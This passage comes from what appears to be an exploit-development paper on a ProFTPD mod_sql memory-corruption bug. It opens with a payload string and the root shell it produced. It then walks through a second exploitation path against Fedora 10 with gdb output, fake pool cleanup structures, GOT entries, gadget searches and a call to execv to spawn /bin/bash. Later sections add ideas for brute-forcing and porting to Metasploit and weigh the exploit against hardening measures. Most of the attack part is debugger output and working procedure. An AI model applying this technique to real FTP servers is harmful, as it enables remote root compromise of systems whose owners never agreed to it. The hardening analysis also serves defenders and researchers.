+%mA%m%f%f%l%m%TA%m%m%f%l%TA%fA%l%Z%fA%T%T%l%f%l%f%f%Z%l%m%Z%f%l%T%f%Z%fAAA%
+Z%l%m%fA%l%m%TA%ZA%f%lAA%f%m%Z%Z%Z%T%Z%f%m%Z%l%fA%Z
+530 Login incorrect.
+*** With luck, you should have a shell ***
+
+id
+uid=0(root) gid=65534(nogroup) groups=65534(nogroup)
+uname -a
+Linux ubuntu 2.6.27-14-generic #1 SMP Tue Aug 18 16:25:45 UTC 2009 i686 
+GNU/Linux
+---
+
+Well, that demonstrates from source code to shellcode execution..
+exploitation via the demonstrated avenue isn't ideal, but still pretty
+decent.
+
+------[ 4.1 - Cleanup structure crash ]
+
+While experimenting with the auth bypass idea with one of the
+3d10e2a054d8124ab4de5b588c592830 crashes, I hit a pool cleanup structure, 
+and decided to experiment further (with a overwrite of 44 bytes), and 
+exploit it without any shellcode required. 
+
+For this section, we'll target Fedora 10, and the following packages:
+
+fbf3dccc1a396cda2d8725b4503bfc16 proftpd-1.3.1-6.fc10.i386.rpm
+938fd1a965d72ef44cd4106c750a0a2d proftpd-mysql-1.3.1-6.fc10.i386.rpm
+
+Firstly, we'll quickly review some of the protection measures 
+enabled/available in Fedora 10. 
+
+- Exec-shield
+  - Aims to prevent code execution via Code Selector limits, or via PAE.
+  - CS limits are not ideal. 
+
+- FORTIFY_SOURCE
+  - Instruments code during compiling and aims to prevent overflows via
+    common library functions. 
+
+- PIE binaries
+  - Some binaries available in Fedora 10 are compiled as a position 
+    independant executable (PIE). 
+  - Numerous binaries are compiled as ET_EXEC's, however, including
+    ProFTPD.
+
+- SELinux
+  - SELinux is a kernel feature that allows mandatory access control in the
+    kernel. For what we're concerned about, it's aimed at restricting what 
+    can happen post exploitation. A frequent criticism of SELinux is that 
+    it does not protect the kernel against attack.
+
+So, looking at the crash:
+
+Program received signal SIGSEGV, Segmentation fault.
+destroy_pool (p=0x8731eac) at pool.c:415
+415         if (p->parent->sub_pools == p)
+(gdb) p *p
+$1 = {first = 0x61413561, last = 0x37614136, cleanups = 0x41386141,
+sub_pools = 0x62413961, sub_next = 0x31624130, sub_prev = 0x0,
+  parent = 0x62413362, free_first_avail = 0x8002927 <Address 0x8002927
+out of bounds>, tag = 0x0}
+
+Quick glance at the source code (from the proftpd-1.3.2-rc2 release, not
+the fedora release):
+
+---
+410 void destroy_pool(pool *p) {
+411   if (p == NULL)
+412     return;
+413
+414   pr_alarms_block();
+415
+416   if (p->parent) {
+417     if (p->parent->sub_pools == p)
+418       p->parent->sub_pools = p->sub_next;
+419
+420     if (p->sub_prev)
+421       p->sub_prev->sub_next = p->sub_next;
+422
+423     if (p->sub_next)
+424       p->sub_next->sub_prev = p->sub_prev;
+425   }
+426   clear_pool(p);
+427   free_blocks(p->first, p->tag);
+428
+429   pr_alarms_unblock();
+430 }
+---
+
+So, we can see that we overwrote p->parent, and thus entered the 
+conditional on line 416. In order to effectively bypass that section, we
+need:
+
+- p->parent to point to accessible memory (doesn't matter where, it's
+  unlikely to point to p)
+
+- p->sub_prev got nulled out earlier, so it doesn't matter.
+
+- p->sub_next to point to writable memory.
+
+- p->cleanups to point to some memory to be the cleanup structure.
+
+The cleanup structure looks like:
+
+---
+655 typedef struct cleanup {
+656   void *data;
+657   void (*plain_cleanup_cb)(void *);
+658   void (*child_cleanup_cb)(void *);
+659   struct cleanup *next;
+660 } cleanup_t;
+---
+
+---
+693 static void run_cleanups(cleanup_t *c) {
+694   while (c) {
+695     (*c->plain_cleanup_cb)(c->data);
+696     c = c->next;
+697   }
+698 }
+---
+
+The benefits of run_cleanups is that we could call a bunch of different
+pointers as needed.
+
+So, all we need now is to meet our requirements earlier.. For 
+reading/writing memory, the BSS is fine.
+
+For the cleanup structure, we need something that is not randomized, and
+that we know the offset for. Luckily for us, ProFTPD formats its response 
+into the resp_buf buffer, which is on the BSS.
+
+(gdb) p resp_buf
+$5 = "Login incorrect.\000 for
+%m%m%TA%ZA%f%l%fA%mAA%f%TA%f%f%l%l%m%lA%f%Z%m%m%TA%Z%ZA%T%Z%ZAAA%m%m%f%m%T%
+m%f%fA%T%T%Z%l%T%m%l%f%f%f%Z%Z%l%TA%l%l%f%mAA%Z%TAA%f%m%ZAA%l%Z%Z%m%Z%lA%f%
+m"...
+
+And, it doesn't clear memory, leaving old data available for us to use as 
+our structure location. Our first fake auth will have a bunch of 
+AAAA / BBBB / CCCC we can use for replacing.
+
+With those in mind, we can trigger the vulnerability, and see what's 
+available to us:
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0805c82d in run_cleanups (c=0x80ed933) at pool.c:730
+730         (*c->plain_cleanup_cb)(c->data);
+..
+(gdb) x/10i $eip
+0x805c82d <run_cleanups+16>:    call   *0x4(%ebx)
+(gdb) x/4x $ebx
+0x80ed933 <resp_buf+179>:       0x42424242      0x43434343
+0x44444444      0x45454545
+
+Hm, so we need a location in memory to jump to. We control the first
+argument to the function, which is useful. . Looking at the symbol
+table, we see some stuff of interest:
+
+
+080e44f4 R_386_JUMP_SLOT   __printf_chk
+080e4574 R_386_JUMP_SLOT   mempcpy
+080e4578 R_386_JUMP_SLOT   __memcpy_chk
+080e4604 R_386_JUMP_SLOT   dlsym
+080e46a4 R_386_JUMP_SLOT   execv
+080e469c R_386_JUMP_SLOT   memcpy
+080e48d4 R_386_JUMP_SLOT   mmap64
+080e4800 R_386_JUMP_SLOT   strcat
+
+
+dlsym() might be useful if we can get the results and save it somewhere.
+
+memcpy()/strcat()/memcpy()/etc could be useful for constructing a ret to
+libc style attack.
+
+printf() could be used to leak memory contents. Can't use it for writing
+to memory due to FORTIFY_SOURCE.
+
+mmap64() could be useful to map memory readable, writable and executable 
+(assuming SELinux allows it, which is unlikely in recent releases).
+
+execv() could be used to execute an arbitrary process (assuming not
+prevented by SELinux). execv() takes two parameters, program to execute, 
+and argument list. The argument list must consist of valid pointers to 
+readable memory, or the execve() (syscall) will fail.
+
+Since execv() looks like least effort, we'll need to find a way to modify 
+the stack so that the next argument is a pointer to something suitable (a 
+pointer to NULL would be sufficient)
+
+(gdb) x/4x $esp
+0xbf977c60:     0x42424242      0x080ccbe2      0x080e8a40
+0x08730578
+(gdb) x/s 0x080ccbe2
+0x80ccbe2:       "getgroups"
+
+Taking stock of what we have:
+
+eax            0x42424242       1111638594
+ecx            0x8734e10        141774352
+edx            0x80eb040        135180352
+ebx            0x80ed933        135190835
+esp            0xbf977c60       0xbf977c60
+ebp            0xbf977c78       0xbf977c78
+esi            0x8731eac        141762220
+edi            0x80f680c        135227404
+
+We control eax, edx (edx is the fake pointer for sub_prev/sub_next
+stuff), we control ebx to an extent:
+
+(gdb) x/7x $ebx
+0x80ed933 <resp_buf+179>: 0x42424242 0x43434343 0x44444444 0x45454545
+0x80ed943 <resp_buf+195>: 0x46464646 0x47474747 0x48484848
+
+We control esi to an extent:
+(gdb) x/s $esi
+0x8731eac:       "a5Aa6Aa73\331016\ba9Ab@\260\016\b"
+
+So, with that in mind, we are looking for writes to stack at [esp], 
+[esp+4], [esp+8] and [esp+0xc], and hopefully then a jump register. 
+
+We can assemble a bunch of instructions, and use msfelfscan to show 
+potential hits:
+
+ruby msfelfscan -r
+"\x89[\x44\x54]\x24[\x04\x08\x0c][^\xff\xe8]*\xff[\x53\x10\x50\xd0-\xe0]"
+/usr/sbin/proftpd
+[/usr/sbin/proftpd]
+0x0805b10a 8944240c89d02b4308894424088b431089142489442404ff53
+0x0805b81d 894424048b450c890424ffd2
+0x0805cd62 8944240c8b4310894424088b4208894424048b4204890424ffd7
+0x0805e158 8944240889742404c70424df7b0d08ffd7
+0x08063ed8 8944240c8b431c894424088b4318894424048b4314890424ff53
+0x080706cc 895424048b5508891424ff50
+0x08070720 89442404a13cd80e088b5508891424ff50
+0x08070754 89442404a144d80e088b5508891424ff50
+0x08070787 89442404a140d80e088b5508891424ff50
+0x08070a84 89542404ff50
+0x08070acb 89442404a13cd80e08ff50
+0x08070af3 89442404a144d80e08ff50
+0x08070b5a 89442404a140d80e08ff50
+0x08070cc2 89542404ff50
+0x08070ce3 89442404a13cd80e08ff50
+0x08070d0b 89442404a144d80e08ff50
+0x08070d4a 89442404a140d80e08ff50
+0x08072081 8944240ca184ec0e08890424ffd2
+0x08072127 8944240c8b4604c744240462c20c0889442408a184ec0e08890424ffd2
+0x080721da 8944240ca184ec0e08890424ffd2
+0x0807222b 8944240c8b4604c74424046ac20c0889442408a184ec0e08890424ffd2
+0x080722ac 89442408a184ec0e08890424ffd2
+0x0807824b 894424088954240c8b460489342489442404ff53
+0x080782f2 8954240c894424088b460489342489442404ff53
+0x08078388 8944240c8b450c894424088b460489342489442404ff53
+0x08078468 8944240c8b450c894424088b460489342489442404ff53
+0x08078798 894424088b460489342489442404ff53
+0x08078a4b 89442404ff53
+0x08079b08 8944240889742404891c24ffd2
+0x08079bf2 8944240c8b450c89442408ff53
+0x08079c93 89442404ff53
+0x08079d1c 89442404ff53
+0x0807a16c 8944240c8b450c89442408ff53
+0x0807a264 89442408ff53
+0x0807a7e7 89442408ffd6
+0x0807c7d3 89442404ff53
+0x0807c85c 89442404ff53
+0x0807cc9c 8944240c8b450c89442408ff53
+0x0807e412 89542408894c2404893424ffd3
+0x0807f209 89442404ffd7
+0x0807f222 89442404ffd7
+0x0807f262 89442404ffd7
+
+After spending some time looking at the output, we find one that fits the 
+bill, and is absolutely perfect.
+
+(gdb) x/10i 0x08063ed8
+0x8063ed8 <run_schedule+56>:    mov    %eax,0xc(%esp)
+0x8063edc <run_schedule+60>:    mov    0x1c(%ebx),%eax
+0x8063edf <run_schedule+63>:    mov    %eax,0x8(%esp)
+0x8063ee3 <run_schedule+67>:    mov    0x18(%ebx),%eax
+0x8063ee6 <run_schedule+70>:    mov    %eax,0x4(%esp)
+0x8063eea <run_schedule+74>:    mov    0x14(%ebx),%eax
+0x8063eed <run_schedule+77>:    mov    %eax,(%esp)
+0x8063ef0 <run_schedule+80>:    call   *0xc(%ebx)
+
+If we execute from 0x8063ee3, it does the job perfectly. It will load 
+pointers from $ebx (which we can populate however we want), and stick them 
+on the stack, then jump to an address we want. We will need a program to 
+execute, and a pointer to NULL. We can craft the fakeauth attempt as:
+
+...memory stuff...AAAABBBBCCCC.../bin/sh or /usr/bin/python (as it's
+important to have NULL termination, which will be provided).
+
+Hardware assisted breakpoint 1 at 0x8063ee3: file support.c, line 132.
+
+Breakpoint 1, 0x08063ee3 in run_schedule () at support.c:132
+132           s->f(s->a1,s->a2,s->a3,s->a4);
+Missing separate debuginfos, use: debuginfo-install
+audit-libs-1.7.13-1.fc10.i386 e2fsprogs-libs-1.41.4-6.fc10.i386
+keyutils-libs-1.2-3.fc9.i386 krb5-libs-1.6.3-18.fc10.i386
+libattr-2.4.43-2.fc10.i386 libselinux-2.0.78-1.fc10.i386
+mysql-libs-5.0.84-1.fc10.i386 zlib-1.2.3-18.fc9.i386
+(gdb) x/8i $eip
+0x8063ee3 <run_schedule+67>:    mov    0x18(%ebx),%eax
+0x8063ee6 <run_schedule+70>:    mov    %eax,0x4(%esp)
+0x8063eea <run_schedule+74>:    mov    0x14(%ebx),%eax
+0x8063eed <run_schedule+77>:    mov    %eax,(%esp)
+0x8063ef0 <run_schedule+80>:    call   *0xc(%ebx)
+(gdb) x/x $ebx+0x18
+0x80ed94b <resp_buf+203>:       0x48484848
+(gdb) x/x $ebx+0x14
+0x80ed947 <resp_buf+199>:       0x47474747
+(gdb) x/x $ebx+0xc
+0x80ed93f <resp_buf+191>:       0x45454545
+
+We can replace HHHH with resp_buf + 400 to point to NULL, we can put in our
+offset for the program to execute in GGGG, and our execv code at EEEE, 
+which will be:
+
+080526b8 <execv@plt>:
+ 80526b8:       ff 25 a4 46 0e 08       jmp    *0x80e46a4
+ 80526be:       68 00 05 00 00          push   $0x500
+ 80526c3:       e9 e0 f5 ff ff          jmp    8051ca8 <_init+0x30>
+
+Putting those together, we then see:
+
+Breakpoint 1, 0x08063ee3 in run_schedule () at support.c:132
+132           s->f(s->a1,s->a2,s->a3,s->a4);
+(gdb) c
+Continuing.
+[New process 22952]
+Executing new program: /bin/bash
+warning: Cannot initialize thread debugging library: generic error
+
+Due to alarm() being called in ProFTPD, you'll have to reset it / catch it 
+/ block it (the "trap" command in bash should be able to do this for you), 
+otherwise the connection will drop out some time later on.
+
+If PIE was enabled, and the binary ended up past 0x01000000, we could brute
+force it and still gain code execution. The only problem now to deal with 
+is with SELinux restrictions. Any decent kernel exploit will disable that 
+for you ;)
+
+------[ 4.2 - Potential enhancements ]
+
+There are a variety of enhancements that could be done to make the exploit 
+better in a variety of ways, such as a known target lists, bruteforce 
+ability (both offset and tags, if necessary. Timing attacks may be useful),
+porting it to metasploit so you have the advantage of changing shellcodes,
+etc.
+
+Also, more work would be required against distributions, because if ProFTPD
+is compiled with shared library support, using time() as an offset may 
+change ;) Additionally, it may be possible that some distributions require 
+different ways due to charcter restrictions.
+
+Further research would be needed in common ProFTPD w/ mod_sql.c 
+configuration guides in order to see what table names / fields are used.
+
+Further experimentation with the pool implementation in ProFTPD might be in
+order, as perhaps it would be possible to work out a generic fake/trigger
+string that would work in all cases. 
+
+Since the SQL injection fix, the bug is no longer remote root pre auth via 
+USER handling it has lost a lot of it's sexiness <;-P~ Don't know if the 
+bug is reachable through authentication.. if it is, there's a lot more work
+involved due to dropped privileges, potential chroot()ing, and so on. At 
+least RootRevoke isn't enabled by default according to some random 
+documentation I was reading :p
+
+------[ 4.3 - Last thoughts ]
+
+Initial experimentation of the vulnerability with constraint solvers was
+interesting, however, in hindsight, just replicating the constraint checks
+and random generation would of been a better idea. Same goes for using GA
+to mutate input strings, though the GA use was worse because the metrics
+used was pretty bad. In hindsight, I had a solution looking for a problem.
+
+Additionally, [11] has some more information regarding this vulnerability
+when you consider the timing aspect of heap massages.
+
+--[ 5 - Discussion of hardening techniques against exploitation ]
+
+It's always fun to consider the effects of various hardening techniques
+against exploitation, and if it helps mitigate the issue. Here's some 
+thoughts on the matter.
+
+------[ 5.1 - Address Space Layout Randomisation ]
+
+If the binary is not compiled as a position independent executable (PIE)
+binary, ASLR is not much of a problem as we target the GOT for storing the
+shellcode. We require only one offset, and on non-PIE binaries, we should 
+be in luck.
+
+------[ 5.2 - Non-executable Memory ] 
+
+With kernels using PAE and hardware supported NX-bit will break our 
+shellcode approach, however, it will not affect our approach used in 
+"Cleanup structure crash".
+
+With kernels that use CS limit to approximate non executable memory, it may
+be possible that a higher region of memory is marked executable, and thus 
+our shellcode region is executable. The metasploit stager shellcode reads
+onto the stack and jumps to it, so cs limit approximation would block that
+attempt. A suitable mprotect() call could fix it though.
+
+It may be possible use the overflow to make ProFTPD think we have been 
+authenticated, without requiring any shellcode. Assuming the pool memory 
+layout is not irreparably harmed, we may be able to do some interesting 
+things.
+
+------[ 5.3 - Position Independent Executable Binaries ]
+
+In case of PIE, it would be feasible to brute force the randomisation as
+ProFTPD fork()s for each client connection. In order to make the most of
+ASLR, ProFTPD would have to fork+execve() itself, or be configured to use
+xinetd/inetd (which would probably be a significant performance problem on 
+busy sites). Using fork+execve() would be the best approach as it would 
+require least changes by the user except an update to ProFTPD.
+
+The avenue we are using for exploitation does not lend itself to off-by-X 
+overwrites, as our contents is appended by ')\x00, which restricts the 
+characters we can use dramatically. 
+
+As for information leaks, I have seen heap address info leaks when the 
+server replies with "Password needed for <OUR CONTENT><MANGLED HEAP 
+ADDRESS>". This may be useful at some stage if a different avenue is needed
+for exploitation.
+
+Unfortunately, ProFTPD frequently uses pcalloc() which reduces the 
+potential for info leaks in some other cases.
+
+------[ 5.4 - Stack Protector ] 
+
+SSP does not play much of a part as we are not overwriting the stack, and 
+nor are we abusing a libc function to overwrite contents (due to recent 
+instrumentation added to gcc/glibc/so on). So far, targeting the stack 
+seems irrelevant, and due to ASLR being in modern kernels, not that useful.
+
+------[ 5.5 - RelRO ]
+
+If readonly relocations is enabled on the target binary, (and being 
+enforced/enabled properly) it will break our current avenue of overwriting
+the GOT table to gain control of execution. 
+
+However, it may be possible to target .bss heap pointers in ProFTPD that 
+get called. (objdump -tr /usr/local/sbin/proftpd | grep bss | grep 0004 or 
+so should find potential function pointers :p)
+
+Assuming non-executable memory is not in use, the BSS provides a suitable
+location to store our shellcode, due to the proctitle.c code.
+
+--[ 6 - References
+
+[1]  http://www.proftpd.org
+[2]  http://labix.org/python-constraint
+[3]  http://bitbucket.org/haypo/python-ptrace/
+[4]  http://pyevolve.sourceforge.net/
+[5]  http://www.castaglia.org/proftpd/doc/devel-guide/introduction.html
+[6]  http://www.phreedom.org/solar/exploits/proftpd-ascii/
+[7]  ga_exp_find.py in the attached code.. my bash history says I used
+     it with python ga_exp_find.py -o 32 -i 127.0.0.1 -U -s f .. for 
+     what it's worth :p
+[8]  http://dev.mysql.com/doc/refman/5.0/en/string-syntax.html
+[9]  code/final_exploit/exploit.py
+[10] code/final_exploit/exploitsc.py
+[11] http://felinemenace.org/~andrewg/Timing_attacks_and_heap_exploitation/
+
+
